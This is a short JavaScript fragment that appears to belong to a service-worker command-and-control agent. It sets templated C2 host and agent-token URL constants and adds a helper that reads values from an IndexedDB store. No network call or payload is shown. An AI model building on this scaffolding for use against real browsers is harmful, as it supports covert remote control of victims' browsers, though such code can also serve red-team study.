
C2_HOST = '//{{host}}';
C2_SERVER = C2_HOST + '/agent/{{agent_token}}';

function ReadIDB(key, reject){
  var request = indexedDB.open("swdb", 1);
  request.onupgradeneeded = function(event){ 
    // console.log("onupgradeneeded");
    // Save the IDBDatabase interface 
    var db = event.target.result;
    // Create an objectStore for this database
    var objectStore = db.createObjectStore("swobjstore");
  };
  request.onerror = function(event){
    // console.log("onerror");
  };
  request.onsuccess = function(event){
    // console.log("onsuccess1");
    var db = event.target.result;
    var transaction = db.transaction(["swobjstore"], "readwrite");
    var objectStore = transaction.objectStore("swobjstore");
    var getRequest = objectStore.get(key);
    getRequest.onsuccess = function(event){
      // console.log("onsuccess");
      reject(getRequest.result);
    }
  };
}
